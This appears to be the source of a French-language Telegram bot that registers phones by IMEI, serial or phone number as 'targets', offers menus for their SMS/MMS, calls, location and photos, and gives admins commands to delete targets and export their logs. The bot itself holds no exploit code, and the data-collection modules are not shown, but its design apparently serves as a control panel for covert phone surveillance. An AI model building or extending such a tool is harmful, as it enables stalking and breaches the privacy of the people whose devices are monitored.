from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    ContextTypes
)
from telegram import Update, ReplyKeyboardMarkup
from telegram.ext import filters
import os
import database
import file_manager
import report_generator
from config import BOT_TOKEN, ADMIN_IDS, DATA_PATH, DB_NAME

# Initialisation de la base de données
database.init_db(DB_NAME)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🔍 Entrez un IMEI, numéro de série (SN) ou numéro de téléphone (format international) pour commencer."
    )

async def handle_search(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_input = update.message.text.strip()
    user_id = update.effective_user.id

    # Validation de l'identifiant
    if file_manager.validate_device_id(user_input):
        # Créer le dossier si nécessaire
        device_path = file_manager.create_device_folder(user_input)
        # Enregistrer l'appareil en base
        database.add_device(DB_NAME, user_input, "AUTO")

        # Menu interactif
        keyboard = [
            ["📱 SMS/MMS", "📞 Appels"],
            ["📍 Localisation", "🖼️ Photos"],
            ["📊 Statistiques", "⚙️ Admin"]
        ]
        reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
        await update.message.reply_text(
            f"✅ Dossier créé pour : {user_input}\nSélectionnez une catégorie :",
            reply_markup=reply_markup
        )
    else:
        await update.message.reply_text("❌ Format invalide. Veuillez entrer un IMEI (15 chiffres), SN (alphanumérique) ou numéro international (ex: +33612345678).")

async def admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ Accès refusé.")
        return

    # Afficher le panel admin
    await update.message.reply_text(
        "🛠️ Panel Admin :\n"
        "/delete_target [id] - Supprimer une cible\n"
        "/export [id] - Exporter les logs en CSV\n"
        "/exportpdf [id] - Exporter les logs en PDF\n"
        "/stats_target [id] - Statistiques d'une cible"
    )

async def delete_target(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ Accès refusé.")
        return

    if not context.args:
        await update.message.reply_text("Usage: /delete_target <id>")
        return

    target_id = context.args[0]
    if file_manager.delete_device_folder(target_id):
        database.delete_device(DB_NAME, target_id)
        await update.message.reply_text(f"✅ Cible {target_id} supprimée.")
    else:
        await update.message.reply_text(f"❌ Erreur lors de la suppression de {target_id}.")

def run_bot():
    # Créer l'application avec le nouveau système
    application = ApplicationBuilder().token(BOT_TOKEN).build()
    
    # Ajouter les handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("admin", admin_command))
    application.add_handler(CommandHandler("delete_target", delete_target))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_search))
    
    # Démarrer le bot
    print("Bot démarré...")
    application.run_polling()

if __name__ == '__main__':
    run_bot()
